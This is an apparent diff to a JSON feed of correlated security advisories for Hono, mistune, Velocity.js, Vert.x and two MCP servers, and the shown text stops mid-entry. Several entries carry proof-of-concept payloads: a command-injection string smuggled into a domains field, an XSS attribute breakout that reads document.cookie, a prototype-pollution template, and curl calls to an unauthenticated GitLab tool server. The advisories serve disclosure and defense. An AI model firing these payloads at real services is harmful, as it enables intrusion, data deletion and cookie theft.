@@ -1,5 +1,249 @@
 {
-  "candidate_count": 0,
-  "candidates": [],
-  "correlated_at": "2026-05-09T00:10:58.861499+00:00"
+  "candidate_count": 9,
+  "candidates": [
+    {
+      "canonical_id": "CVE-2026-44457",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-524"
+      ],
+      "description": "### Summary\n\nCache Middleware does not skip caching for responses that declare per-user variance via `Vary: Authorization` or `Vary: Cookie`. As a result, a response cached for one authenticated user may be served to subsequent requests from different users.\n\n### Details\n\nThe Cache Middleware skips caching when a response carries `Vary: *`, certain `Cache-Control` directives (`private`, `no-store`, `no-cache`), or `Set-Cookie`. However, `Vary: Authorization` and `Vary: Cookie` \u2014 the standard signals defined in RFC 9110 / RFC 9111 to indicate per-user responses \u2014 are not treated as cache-skip reasons.\n\nThis issue arises when applications use the Cache Middleware on endpoints that return user-specific data and rely on `Vary: Authorization` or `Vary: Cookie` to scope the response per user, without also setting `Cache-Control: private`.\n\n### Impact\n\nA user may receive a cached response that was originally generated for a different authenticated user. This may lead to:\n\n- Disclosure of personally identifiable information or other user-specific data present in the response body\n- Inconsistent or incorrect behavior in user-specific endpoints\n\nThis issue affects applications that use the Cache Middleware on endpoints whose responses vary by `Authorization` or `Cookie` and that do not also set `Cache-Control: private`.",
+      "first_seen": "2026-05-09T03:53:09.836044+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.836044+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-p77w-8qqv-26rm",
+        "https://github.com/honojs/hono/security/advisories/GHSA-p77w-8qqv-26rm"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Hono's Cache Middleware ignores Vary: Authorization / Vary: Cookie leading to cross-user cache leakage"
+    },
+    {
+      "canonical_id": "CVE-2026-44458",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-116",
+        "CWE-74"
+      ],
+      "description": "### Summary\n\nThe JSX renderer escapes `style` attribute object values for HTML but not for CSS. Untrusted input in a `style` object value or property name can therefore inject additional CSS declarations into the rendered `style` attribute. The impact is limited to CSS and does not allow JavaScript execution or HTML attribute breakout.\n\n### Details\n\n`style` object values are serialized into a CSS declaration list and escaped for HTML attribute context only. Characters that act as CSS declaration boundaries \u2014 such as `;`, comment markers, quoted strings, and block delimiters \u2014 are valid in HTML attribute content and can extend a value beyond its assigned property.\n\nThis issue arises when untrusted input is interpolated into a JSX `style` object and rendered server-side.\n\n### Impact\n\nAn attacker who can control the value or property name of a `style` object may inject arbitrary CSS declarations. This may lead to:\n\n- Visual manipulation of the page, including full-viewport overlays usable for phishing\n- Outbound requests to attacker-controlled hosts via CSS resource references such as `url(...)`\n- Hijacking of UI affordances through layout, positioning, or visibility changes\n\nThis issue affects applications that render JSX on the server with `style` object values or property names derived from untrusted input.",
+      "first_seen": "2026-05-09T03:53:09.835700+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.835700+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-qp7p-654g-cw7p",
+        "https://github.com/honojs/hono/security/advisories/GHSA-qp7p-654g-cw7p"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Hono has CSS Declaration Injection via Style Object Values in JSX SSR"
+    },
+    {
+      "canonical_id": "CVE-2026-44459",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1284"
+      ],
+      "description": "### Summary\n\nImproper validation of the JWT NumericDate claims `exp`, `nbf`, and `iat` in `hono/utils/jwt` allows tokens with non-spec-compliant claim values to silently bypass time-based checks. This issue is not exploitable by an anonymous attacker; it only manifests when a malformed claim value reaches `verify()` \u2014 typically when the application itself issues such tokens, or when the signing key is otherwise under attacker control.\n\n### Details\n\nThe validation routine combined option, presence, and threshold checks in a single short-circuiting expression, so several classes of malformed values were silently skipped instead of rejected:\n\n- A falsy numeric value short-circuited the presence check.\n- A non-finite numeric value compared as never-after-now and never-expired.\n- A non-numeric type produced NaN comparisons that evaluated false.\n\nThis deviates from RFC 7519 \u00a74.1.4, which defines NumericDate as a finite JSON numeric value.\n\n### Impact\n\nAn actor able to issue tokens accepted by the application may craft tokens whose `exp`, `nbf`, or `iat` claims silently bypass time-based enforcement. This may lead to:\n\n- Tokens treated as never expiring even with `exp` configured on the verifier.\n- Tokens with a future `nbf` accepted as currently valid.\n- Tokens with a future `iat` accepted as legitimately issued.\n\nDeployments using a well-formed token issuer and protecting the signing key are not affected.",
+      "first_seen": "2026-05-09T03:53:09.835751+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.835751+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-hm8q-7f3q-5f36",
+        "https://github.com/honojs/hono/security/advisories/GHSA-hm8q-7f3q-5f36"
+      ],
+      "severity": "low",
+      "source_count": 1,
+      "title": "Hono has improper validation of NumericDate claims (exp, nbf, iat) in JWT verify()"
+    },
+    {
+      "canonical_id": "CVE-2026-44895",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-306",
+        "CWE-942"
+      ],
+      "description": "## SSE Transport Has No Authentication and Wildcard CORS, Exposing All 86 GitLab Tools Including Destructive Operations\n\nA review of `mcp-gitlab-server` at commit `80a7b4cf3fba6b55389c0ef491a48190f7c8996a` uncovered that the SSE HTTP transport \u2014 advertised in the README and comparison table as a differentiating feature \u2014 runs with no authentication and wildcard CORS on every endpoint. The maintainers' own roadmap confirms auth is a known gap.\n\nWhen `USE_SSE=true`, the HTTP server in `src/transport.ts` sets:\n\n```typescript\nres.setHeader('Access-Control-Allow-Origin', '*');\nres.setHeader('Access-Control-Allow-Methods', 'GET, POST');\nres.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n```\n\nThe `httpServer.listen(port)` call at line 97 passes no host argument \u2014 Node.js defaults to `0.0.0.0`, binding on all interfaces. Two endpoints are exposed with no credential check:\n\n- `GET /sse` \u2014 opens an SSE connection, returns a session endpoint URL\n- `POST /messages?sessionId=<id>` \u2014 sends MCP messages to the server using the loaded `GITLAB_PERSONAL_ACCESS_TOKEN`\n\nAny caller who can reach the port \u2014 LAN, cloud instance, or via the browser-tab vector the wildcard CORS enables \u2014 gets full access to all 86 tools the server exposes using the operator's GitLab PAT. That includes `delete_repository`, `delete_group`, `push_files`, `create_merge_request`, `update_repository_settings`, and any other tool the server exposes. The PAT doesn't leave the process, but every API call it backs is available to the unauthenticated caller.\n\nThe wildcard CORS makes the browser-tab vector direct: any web page the operator visits while the server is running can open an SSE connection and make tool calls via cross-origin fetch. No user interaction beyond visiting the page.\n\n**PoC \u2014 reproduces from the documented USE_SSE=true configuration:**\n\n```bash\n# Step 1: connect SSE and capture the session endpoint\ncurl -N http://localhost:3000/sse &\n# Output includes: event: endpoint\n#                  data: /messages?sessionId=<UUID>\n\n# Step 2: call any tool \u2014 no auth header needed\ncurl -X POST \"http://localhost:3000/messages?sessionId=<UUID>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"method\": \"tools/call\",\n    \"params\": {\n      \"name\": \"get_repository\",\n      \"arguments\": {\"project_id\": \"target-org/private-repo\"}\n    }\n  }'\n# Returns repository data using the operator's GitLab PAT\n\n# Same path works for delete_repository, push_files, etc.\n```\n\n## Root cause\n\nThe HTTP transport in `src/transport.ts` ships with no authentication layer at all and a wildcard `Access-Control-Allow-Origin: *` on every response. The structural defect is that the SSE server stands up a stateful, mutation-capable RPC endpoint that is backed by the operator's `GITLAB_PERSONAL_ACCESS_TOKEN` without any inbound credential check, then advertises itself to every cross-origin browser context via the wildcard CORS header. The `httpServer.listen(port)` call at line 97 also passes no host argument, so the bind defaults to `0.0.0.0` and exposes the auth-less surface on every interface. Auth isn't fail-opening on a missing config \u2014 there is no auth check at any code path on either `/sse` or `/messages?sessionId=...`.\n\n## Auth boundary violated\n\nTrust-domain boundary \u2014 untrusted cross-origin browser context (and any unauthenticated network caller) crossing into the trusted server-state-mutating GitLab API surface that the operator's PAT backs. Respected-here: nothing. The transport carries no `Authorization` check, no origin allowlist, no session-binding to the originating client, and no host restriction. Ignored-there: the SSE handler at `src/transport.ts` accepts an arbitrary `Origin` (since `Access-Control-Allow-Origin: *`), opens a session, and the matching `POST /messages?sessionId=...` proxies tool calls \u2014 including `delete_repository`, `push_files`, `update_repository_settings` \u2014 to the GitLab API using the operator's PAT. Any web page the operator visits while the server runs can drive the full 86-tool surface via cross-origin fetch.\n\nThe roadmap in `README.md` at line 190 includes `- [ ] SAML/OAuth3 authentication` \u2014 confirming the maintainers are already tracking this gap. The issue is disclosure of impact in the interim: operators who follow the README's SSE setup instructions and don't see an auth requirement in the docs may reasonably assume the transport is safe to use on a network-accessible host.\n\n**CVSS 4.0:** `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N` \u2014 **~6.3 (Medium)**. `AT:P` reflects the `USE_SSE=true` precondition. When that precondition is met, the effective severity for those deployments is High \u2014 full GitLab PAT access without authentication. The Medium CVSS is the aggregate across all deployments; for any operator who has activated SSE mode (which the README promotes as a feature), the finding is functionally High.\n\n**Fix \u2014 four concrete changes:**\n\n1. Require `MCP_GITLAB_AUTH_TOKEN` as a startup precondition when `USE_SSE=true`. If the env var is unset, the server should exit with a clear message before the HTTP server starts:\n\n   ```typescript\n   if (process.env.USE_SSE === 'true') {\n     if (!process.env.MCP_GITLAB_AUTH_TOKEN) {\n       console.error(\n         'ERROR: MCP_GITLAB_AUTH_TOKEN must be set when USE_SSE=true. ' +\n         'SSE transport without authentication exposes all GitLab tools to unauthenticated callers.'\n       );\n       process.exit(1);\n     }\n   }\n   ```\n\n   The token check in `src/transport.ts` validates it on every request:\n   ```typescript\n   const authToken = process.env.MCP_GITLAB_AUTH_TOKEN;\n   if (authToken) {\n     const provided = req.headers['authorization']?.replace(/^Bearer /, '');\n     if (provided !== authToken) {\n       res.writeHead(401);\n       res.end(JSON.stringify({ error: 'Unauthorized' }));\n       return;\n     }\n   }\n   ```\n\n2. Bind to `127.0.0.1` by default for the SSE transport rather than `0.0.0.0`. An explicit `MCP_GITLAB_HOST=0.0.0.0` flag with a startup banner warning can expose it to the network for operators who need that \u2014 but the safe default should be loopback-only.\n\n3. Replace the wildcard `Access-Control-Allow-Origin: *` with a localhost-only default. When network exposure is intentional (explicit flag + auth token set), an explicit `CORS_ORIGINS` allowlist should be required.\n\n4. The SAML/OAuth3 roadmap item is the right long-term direction. In the interim \u2014 before that ships \u2014 the three changes above are entirely in the existing codebase with no new dependencies.\n\n---\n\nNo prior security advisories, CVEs, or public security issues exist for this package \u2014 a search of the repository issue list and npm advisory database did not yield any duplicate issues.",
+      "first_seen": "2026-05-09T03:53:09.836166+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.836166+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-8jr5-6gvj-rfpf",
+        "https://github.com/yoda-digital/mcp-gitlab-server/security/advisories/GHSA-8jr5-6gvj-rfpf"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "@yoda.digital/gitlab-mcp-server's SSE transport has no authentication and wildcard CORS, exposing all 86 GitLab tools"
+    },
+    {
+      "canonical_id": "CVE-2026-44897",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Summary\n`HTMLRenderer.heading()` builds the opening `<hN>` tag by string-concatenating the `id` attribute value directly into the HTML \u2014 with no call to `escape()`, `safe_entity()`, or any other sanitisation function. A double-quote character `\"` in the `id` value terminates the attribute, allowing an attacker to inject arbitrary additional attributes (event handlers, `src=`, `href=`, etc.) into the heading element.\n\nThe default TOC hook assigns safe auto-incremented IDs (`toc_1`, `toc_2`, \u2026) that never contain user text. However, the `add_toc_hook()` API accepts a caller-supplied `heading_id` callback. Deriving heading IDs from the heading text itself \u2014 to produce human-readable slug anchors like `#installation` or `#getting-started` \u2014 is by far the most common real-world usage of this callback (every major documentation generator does this). When the callback returns raw heading text, an attacker who controls heading content can break out of the `id=` attribute.\n\n## Details\n**File:** `src/mistune/renderers/html.py`\n\n```python\ndef heading(self, text: str, level: int, **attrs: Any) -> str:\n    tag = \"h\" + str(level)\n    html = \"<\" + tag\n    _id = attrs.get(\"id\")\n    if _id:\n        html += ' id=\"' + _id + '\"'    # \u2190 _id is never escaped\n    return html + \">\" + text + \"</\" + tag + \">\\n\"\n```\n\nThe `text` body (line content) *is* escaped upstream by the inline token renderer, which is why `text` arrives as `&quot;` etc. But `_id` arrives as a raw string directly from whatever the `heading_id` callback returned \u2014 no escaping occurs at any point in the pipeline.\n\n## PoC\n**Step 1 \u2014 Establish the baseline (safe default IDs)**\n\nThe script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom `heading_id` callback). The default hook generates sequential numeric IDs:\n\n```python\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)          # default: heading_id produces toc_1, toc_2, \u2026\n\nbl_src = \"## Introduction\\n\"\nbl_out, _ = md_safe.parse(bl_src)\n```\n\nOutput \u2014 ID is auto-generated, no user text appears in it:\n```html\n<h2 id=\"toc_1\">Introduction</h2>\n```\n\n**Step 2 \u2014 Add the realistic trigger: a text-based `heading_id` callback**\n\nDeriving an anchor ID from the heading text is the standard real-world pattern (slugifiers, `mkdocs`, `sphinx`, `jekyll` all do this). The PoC uses the simplest possible version \u2014 return the raw heading text unchanged \u2014 to show the vulnerability without any extra transformation:\n\n```python\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")   # returns raw heading text as the ID\n\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n```\n\n**Step 3 \u2014 Craft the exploit payload**\n\nConstruct a heading whose text contains a double-quote followed by an injected attribute:\n\n```\n## foo\" onmouseover=\"alert(document.cookie)\" x=\"\n```\n\nWhen `raw_id` is called, `token[\"text\"]` is `foo\" onmouseover=\"alert(document.cookie)\" x=\"`. This is passed verbatim to `heading()` as the `id` attribute value.\n\n**Step 4 \u2014 Observe attribute breakout in the output**\n\n```python\nex_src = '## foo\" onmouseover=\"alert(document.cookie)\" x=\"\\n'\nex_out, _ = md_vuln.parse(ex_src)\n```\n\nActual output:\n```html\n<h2 id=\"foo\" onmouseover=\"alert(document.cookie)\" x=\"\">foo&quot; onmouseover=&quot;alert(document.cookie)&quot; x=&quot;</h2>\n```\n\nNote: the heading **body text** is correctly escaped (`&quot;`), but the **`id=` attribute** is not. A user who moves their mouse over the heading triggers `alert(document.cookie)`. Any JavaScript payload can be substituted.\n\n### Script \n\nA verification script was created to verify this issue. It creates a HTML page showing the bypass rendering in the browser.\n\n```python\n#!/usr/bin/env python3\n\"\"\"H2: HTMLRenderer.heading() inserts the id= value verbatim \u2014 no escaping.\"\"\"\nimport os, html as h\nfrom mistune import create_markdown\nfrom mistune.toc import add_toc_hook\n\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\n# --- baseline ---\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_file = \"baseline_h2.md\"\nbl_src  = \"## Introduction\\n\"\nwith open(os.path.join(os.getcwd(), bl_file), \"w\") as f:\n    f.write(bl_src)\nbl_out, _ = md_safe.parse(bl_src)\n\nprint(f\"[{bl_file}]\\n{bl_src}\")\nprint(\"[output \u2014 id=toc_1, no user content, safe]\")\nprint(bl_out)\n\n# --- exploit ---\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n\nex_file = \"exploit_h2.md\"\nex_src  = '## foo\" onmouseover=\"alert(document.cookie)\" x=\"\\n'\nwith open(os.path.join(os.getcwd(), ex_file), \"w\") as f:\n    f.write(ex_src)\nex_out, _ = md_vuln.parse(ex_src)\n\nprint(f\"[{ex_file}]\\n{ex_src}\")\nprint(\"[output \u2014 heading_id returns raw text, id= not escaped]\")\nprint(ex_out)\n\n# --- HTML report ---\nCSS = \"\"\"\nbody{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}\nh1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}\np.desc{color:#555;font-size:.9em;margin-top:6px}\n.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}\n.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}\n.baseline .case-header{background:#d1fae5;color:#065f46}\n.exploit  .case-header{background:#fee2e2;color:#7f1d1d}\n.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}\n.panel{padding:16px}\n.panel+.panel{border-left:1px solid #eee}\n.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}\npre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}\n.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}\n.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}\n\"\"\"\n\ndef case(kind, label, filename, src, out):\n    return f\"\"\"\n<div class=\"case {kind}\">\n  <div class=\"case-header\">{'BASELINE' if kind=='baseline' else 'EXPLOIT'} \u2014 {h.escape(label)}</div>\n  <div class=\"panels\">\n    <div class=\"panel\">\n      <h3>Input \u2014 {h.escape(filename)}</h3>\n      <pre>{h.escape(src)}</pre>\n    </div>\n    <div class=\"panel\">\n      <h3>Output \u2014 HTML source</h3>\n      <pre>{h.escape(out)}</pre>\n      <div class=\"rlabel\">\u2193 rendered in browser (hover the heading to trigger onmouseover)</div>\n      <div class=\"rendered\">{out}</div>\n    </div>\n  </div>\n</div>\"\"\"\n\npage = f\"\"\"<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">\n<title>H2 \u2014 Heading ID XSS</title><style>{CSS}</style></head><body>\n<h1>H2 \u2014 Heading ID XSS (unescaped id= attribute)</h1>\n<p class=\"desc\">HTMLRenderer.heading() in renderers/html.py does html += ' id=\"' + _id + '\"' with no escaping.\nTriggered when heading_id callback returns raw heading text \u2014 the most common doc-generator pattern.</p>\n{case(\"baseline\", \"Clean heading \u2192 sequential id=toc_1, safe\", bl_file, bl_src, bl_out)}\n{case(\"exploit\",  \"Malicious heading \u2192 quotes break out of id=, onmouseover injected\", ex_file, ex_src, ex_out)}\n</body></html>\"\"\"\n\nout_path = os.path.join(os.getcwd(), \"report_h2.html\")\nwith open(out_path, \"w\") as f:\n    f.write(page)\nprint(f\"\\n[report] {out_path}\")\n```\n\nExample Usage:\n```bash\npython poc.py\n```\n\nOnce the script is run, open `report_h2.html` in the browser and observe the behaviour.\n\n## Impact\n| Dimension        | Assessment |\n|------------------|-----------|\n| **Confidentiality** | Session cookie / auth token theft via JavaScript execution triggered on mouse interaction |\n| **Integrity**    | DOM manipulation, phishing content injection, forced navigation |\n| **Availability** | Page freeze or crash available to attacker |\n\n**Risk context:** This vulnerability targets the most common customisation point for heading IDs. Any documentation site, wiki, or blog engine that generates slug-style anchors from heading text is vulnerable if it uses mistune's `heading_id` callback without independently sanitising the returned value.",
+      "first_seen": "2026-05-09T03:53:09.836108+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.836108+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-v87v-83h2-53w7",
+        "https://github.com/lepture/mistune/security/advisories/GHSA-v87v-83h2-53w7"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Mistune Heading ID Attribute has Injection XSS"
+    },
+    {
+      "canonical_id": "CVE-2026-44966",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1321"
+      ],
+      "description": "### Summary\nA prototype pollution vulnerability was discovered in Velocity.js <= 2.1.5. This issue occurs during the processing of #set directives in Velocity templates. If an application renders a template controlled by an attacker, it is possible to modify Object.prototype, potentially leading to Denial of Service (DoS) or Remote Code Execution (RCE) depending on the server environment.\n\n### Details\nThe root cause is located in the #set path assignment logic within the source code:\n- File: /src/compile/set.ts \n- Issue: The engine accepts arbitrary path keys and performs assignments using the logic `(baseRef as Record<string, unknown>)[key] = val`.\n\n\nBecause there is no validation or filtering to block sensitive keys such as \\_\\_proto\\_\\_, constructor, or prototype, an attacker can traverse the prototype chain and pollute the global Object.prototype.\n\n### PoC\n```javascript\nconst {render} = require('velocityjs');\ndelete Object.prototype.polluted;\nconsole.log({}.polluted); // \"\"\nrender('#set($__proto__.polluted = \"hacked\")', {});\nconsole.log({}.polluted); // \"hacked\"\ndelete Object.prototype.polluted;\n```\n\n### Impact\n- Vulnerability Type: Prototype Pollution\n- Who is impacted: Any application that renders Velocity templates where the template content can be influenced or controlled by untrusted users.\n- Severity: High. Prototype pollution can often be used to bypass security controls, cause application crashes (DoS), or be chained with other vulnerabilities to achieve code execution.",
+      "first_seen": "2026-05-09T03:53:09.835866+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.835866+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-j658-c2gf-x6pq",
+        "https://github.com/shepherdwind/velocity.js/security/advisories/GHSA-j658-c2gf-x6pq"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Velocity.js has a Prototype Pollution vulnerability through #set path assignment"
+    },
+    {
+      "canonical_id": "CVE-2026-6860",
+      "composite_confidence": 0.95,
+      "cwe": [],
+      "description": "Potential unbounded server-side SNI `SslContext` cache growth in Vert.x TLS handling, with possible resource-exhaustion / DoS impact.\n\nOn affected versions, matching server-side SNI names are cached via `computeIfAbsent(serverName, ...)` in a serverName-keyed `SslContext` cache, and I could not find any bound, TTL, or eviction for that cache.\n\nThe implementation differs slightly by branch, but the same sink appears to be present in released versions `4.3.4` through `5.0.8`:\n- `4.3.x`: `SSLHelper`\n- `4.4.x` / `4.5.x`: `SslChannelProvider`\n- `5.0.x` and current `master`: `SslContextProvider`\n\nIt appears that when server-side SNI is enabled, and wildcard or otherwise broad hostname mappings are used, an unauthenticated client can send many distinct matching SNI names and cause the server to retain increasing numbers of `SslContext` entries over time, leading to increasing memory consumption and possible DoS conditions.\n\nA check was performed on the related TCP SNI path across affected versions, the QUIC SNI path on `5.x`, and the wildcard hostname resolution helpers used during certificate selection.\n\n## Steps to reproduce\n\n1. Configure a Vert.x server with `setSsl(true)` and `setSni(true)`.\n2. Use a keystore or mapping where many distinct SNI names match a wildcard or similarly broad rule.\n3. Send repeated connections with distinct matching SNI values.\n4. Observe that the SNI cache size grows with the number of unique matching names.\n\nLocal observations:\n- initial `sniEntrySize()` = `0`\n- after 20 unique matching names: `20`\n- after 40 unique matching names: `40`\n- repeating previously seen matching names did not grow the cache further\n- non-matching SNI names did not create new cache entries\n\n## What are the affected versions?\n\nAffected released versions confirmed on `origin`:\n- `4.3.4` through `4.3.8`\n- `4.4.0` through `4.4.9`\n- `4.5.0` through `4.5.25`\n- `5.0.0` through `5.0.8`\n\nNot affected by the same sink:\n- `4.0.x` through `4.2.x`\n- `4.3.0` through `4.3.3`\n\n## Are there any ways to mitigate this issue?\n\n- Disable server-side SNI if it is not needed.\n- Avoid wildcard or otherwise high-cardinality hostname mappings where feasible.\n- Apply connection or rate limiting in front of the service.",
+      "first_seen": "2026-05-09T03:53:09.835951+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-09T03:53:09.835951+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-3g76-f9xq-8vp6",
+        "https://github.com/eclipse-vertx/vert.x/pull/6102",
+        "https://github.com/eclipse-vertx/vert.x/security/advisories/GHSA-3g76-f9xq-8vp6",
+        "https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/381",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-6860"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Vert.x has a DoS via unbounded server-side SNI SslContext cache growth"
+    },
+    {
+      "canonical_id": "GHSA-v6wj-c83f-v46x",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "<html>\n<body>\n<!--StartFragment--><html><head></head><body><h1>Security Advisory: OS Command Injection in <code>profullstack/mcp-server</code> <code>domain_lookup</code> Module</h1>\n\nField | Value\n-- | --\nProject | profullstack/mcp-server\nRepository | https://github.com/profullstack/mcp-server\nAffected Commit | 2e8ea913573610667ad54e31dba2e8198ebf7cf9\nAffected Module | mcp_modules/domain_lookup\nAffected Endpoints | POST /domain-lookup/check, POST /domain-lookup/bulk\nVulnerability Type | CWE-78: OS Command Injection\nCVSS 3.1 Score | 9.8 (Critical) \u2014 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nAuthentication Required | None\nDefault Network Exposure | Bind address 0.0.0.0, no global authentication middleware\nValidated | 2026-04-21 (initial), 2026-04-28 (re-confirmed)\n\n\n<hr>\n<h2>Summary</h2>\n<p>The <code>domain_lookup</code> module assembles a shell command string by concatenating user-controlled input (<code>domains</code> / <code>keywords</code>) and passes it to <code>execAsync()</code>. Both HTTP endpoints reach the same sink. Because there is no argument quoting, escaping, or allowlist \u2014 and no authentication on the server \u2014 an unauthenticated remote attacker can execute arbitrary OS commands as the server process.</p>\n<hr>\n<h2>Affected Code</h2>\n<ul>\n<li><code>index.js:27</code> \u2014 server binds to <code>0.0.0.0</code>, no global auth middleware.</li>\n<li><code>mcp_modules/domain_lookup/index.js:52</code> \u2014 registers <code>POST /domain-lookup/check</code>.</li>\n<li><code>mcp_modules/domain_lookup/index.js:55</code> \u2014 registers <code>POST /domain-lookup/bulk</code>.</li>\n<li><code>mcp_modules/domain_lookup/src/service.js:19, :20</code> \u2014 <code>buildTldxCommand()</code> concatenates user input into the shell string.</li>\n<li><code>mcp_modules/domain_lookup/src/service.js:114, :115, :142</code> \u2014 <code>execAsync(command)</code> sink reached from both routes.</li>\n</ul>\n<hr>\n<h2>Vulnerable Code</h2>\n<p><strong>File:</strong> <code>mcp_modules/domain_lookup/src/service.js</code></p>\n<p><strong>Step 1 \u2014 User input concatenated directly into a shell string:</strong></p>\n<pre><code class=\"language-js\">buildTldxCommand(keywords, options = {}) {\n  let command = `tldx ${keywords.join(' ')}`;\n\n  if (options.prefixes?.length) {\n    command += ` --prefixes ${options.prefixes.join(',')}`;\n  }\n}\n</code></pre>\n<p><strong>Step 2 \u2014 That shell string is executed as-is:</strong></p>\n<pre><code class=\"language-js\">async checkDomainAvailability(domains, options = {}) {\n  try {\n    const command = this.buildTldxCommand(domains, options);\n    const { stdout, stderr } = await execAsync(command);\n</code></pre>\n<p>There is no sanitization between Step 1 and Step 2. Shell metacharacters (<code>;</code>, <code>|</code>, <code>$()</code>, etc.) in user input are interpreted by <code>/bin/sh</code> at execution time.</p>\n<hr>\n<h2>Proof of Concept</h2>\n<p>Tested against a local Docker build of the affected commit (<code>0.0.0.0:13000-&gt;3000/tcp</code>).</p>\n<h3>PoC A \u2014 <code>POST /domain-lookup/check</code></h3>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-bash\">curl -X POST http://localhost:13000/domain-lookup/check \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"domains\":[\"example.com; echo final_check_poc &gt; /tmp/verify-exports/final_check.txt; #\"]}'\n</code></pre>\n<p><strong>Response:</strong></p>\n<pre><code>HTTP/1.1 500 Internal Server Error\naccess-control-allow-origin: *\ncontent-type: application/json\nDate: Tue, 21 Apr 2026 04:32:39 GMT\n\n{\"error\":\"tldx command failed: tldx command failed: /bin/sh: tldx: not found\\n\"}\n</code></pre>\n<p><strong>Side effect confirmed inside container:</strong></p>\n<pre><code>$ cat /tmp/verify-exports/final_check.txt\nfinal_check_poc\n</code></pre>\n<h3>PoC B \u2014 <code>POST /domain-lookup/bulk</code></h3>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-bash\">curl -X POST http://localhost:13000/domain-lookup/bulk \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"keywords\":[\"safe\",\"x; echo final_bulk_poc &gt; /tmp/verify-exports/final_bulk.txt; #\"]}'\n</code></pre>\n<p><strong>Response:</strong></p>\n<pre><code>HTTP/1.1 500 Internal Server Error\naccess-control-allow-origin: *\ncontent-type: application/json\nDate: Tue, 21 Apr 2026 04:32:40 GMT\n\n{\"error\":\"Bulk domain check failed: Bulk domain check failed: /bin/sh: tldx: not found\\n\"}\n</code></pre>\n<p><strong>Side effect confirmed inside container:</strong></p>\n<pre><code>$ cat /tmp/verify-exports/final_bulk.txt\nfinal_bulk_poc\n</code></pre>\n<h3>Note on HTTP 